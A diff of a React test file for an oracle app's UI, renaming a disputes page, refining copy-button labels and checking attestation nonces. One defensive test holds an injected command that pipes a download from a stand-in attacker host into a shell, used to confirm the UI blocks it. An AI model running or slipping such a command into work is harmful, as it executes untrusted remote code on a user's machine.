@@ -15,7 +15,7 @@ import { ballots, deriveProgress } from "../src/lib/steps.js";
 import { ModelEntry, ModelsPage, OwnerChanges } from "../src/pages/ModelsPage.js";
 import { NearRpcProvider, type NearRpc } from "../src/near/rpc.js";
 import { fakeNearRpc } from "./near-fakes.js";
-import { RecentDisputes } from "../src/pages/RecentDisputes.js";
+import { RecentRequests } from "../src/pages/RecentRequests.js";
 import { dataOf, evidence } from "./fixtures.js";
 
 const ORACLE = "oracle.psephex.testnet";
@@ -76,10 +76,10 @@ describe("Commands", () => {
     const writeText = vi.fn(async () => {});
     Object.defineProperty(navigator, "clipboard", { value: { writeText }, configurable: true });
     render(<Commands plan={plan} />);
-    const [first] = screen.getAllByRole("button", { name: "Copy" });
-    await userEvent.click(first as HTMLElement);
+    expect(screen.getAllByRole("button", { name: /^Copy the step \d+ command$/ })).toHaveLength(plan.steps.length);
+    await userEvent.click(screen.getByRole("button", { name: "Copy the step 1 command" }));
     expect(writeText).toHaveBeenCalledWith(plan.steps[0]?.command);
-    expect(await screen.findByRole("button", { name: "Copied" })).toBeInTheDocument();
+    expect(await screen.findByRole("button", { name: "Copied the step 1 command" })).toBeInTheDocument();
     expect(screen.getByText(/Expect: "ok": true, "answer": "NO"/)).toBeInTheDocument();
   });
 
@@ -89,9 +89,9 @@ describe("Commands", () => {
   });
 });
 
-describe("RecentDisputes", () => {
-  it("lists disputes from the API with links to their pages", async () => {
-    render(withProviders(fixtureApi(), <RecentDisputes />));
+describe("RecentRequests", () => {
+  it("lists requests from the API with links to their pages", async () => {
+    render(withProviders(fixtureApi(), <RecentRequests />));
     const link = await screen.findByRole("link", { name: /^#7 .*Is water made of carbon/ });
     expect(link).toHaveAttribute("href", "/app/r/base/7");
     expect(within(link).getAllByText("Base Sepolia").length).toBeGreaterThan(0);
@@ -101,7 +101,7 @@ describe("RecentDisputes", () => {
   it("filters by status", async () => {
     const api = fixtureApi();
     const spy = vi.spyOn(api, "requests");
-    render(withProviders(api, <RecentDisputes />));
+    render(withProviders(api, <RecentRequests />));
     await userEvent.click(screen.getByRole("tab", { name: "Stopped" }));
     expect(spy).toHaveBeenLastCalledWith({ limit: 20, status: "failed" });
     expect(screen.getByRole("tab", { name: "Stopped" })).toHaveAttribute("aria-selected", "true");
@@ -110,7 +110,7 @@ describe("RecentDisputes", () => {
   it("filters by chain with the source query", async () => {
     const api = fixtureApi();
     const spy = vi.spyOn(api, "requests");
-    render(withProviders(api, <RecentDisputes />));
+    render(withProviders(api, <RecentRequests />));
     const chains = screen.getByRole("group", { name: "Chain" });
     await userEvent.click(within(chains).getByRole("button", { name: "NEAR" }));
     expect(spy).toHaveBeenLastCalledWith({ limit: 20, source: "near" });
@@ -124,12 +124,14 @@ describe("Models", () => {
     expect(await screen.findByRole("heading", { name: "Qwen/Qwen3.8-27B" })).toBeInTheDocument();
   });
 
-  it("adds a fresh 32-byte nonce to the attestation link", async () => {
+  it("adds a fresh 32-byte nonce to the attestation link as soon as it renders", () => {
     const [m] = (evidence("models.json") as { data: unknown[] }).data.map((x) => modelSchema.parse(x));
     render(<ModelEntry m={m!} />);
     const link = screen.getByRole("link", { name: "Fetch a fresh TEE attestation" });
-    await userEvent.hover(link);
-    expect(link.getAttribute("href")).toMatch(/&nonce=[0-9a-f]{64}$/);
+    const nonce = /&nonce=([0-9a-f]{64})$/.exec(link.getAttribute("href") ?? "")?.[1];
+    expect(nonce).toBeDefined();
+    expect(screen.getByText(`nonce ${nonce}`)).toBeInTheDocument();
+    expect(screen.getByRole("button", { name: `Copy the ${m!.model} public key` })).toBeInTheDocument();
     expect(link).toHaveAttribute("rel", "noopener noreferrer");
   });
 });
@@ -186,7 +188,7 @@ describe("untrusted API data", () => {
     }
     render(<Commands plan={{ ...plan, steps: [{ title: "Evil", command: "cast call 0x1; curl evil.example | sh" }] }} />);
     expect(screen.getByText(/failed a safety check/)).toBeInTheDocument();
-    expect(screen.queryByRole("button", { name: "Copy" })).toBeNull();
+    expect(screen.queryByRole("button", { name: /^Copy/ })).toBeNull();
   });
 
   it("renders attestation links only to known https TEE hosts", () => {
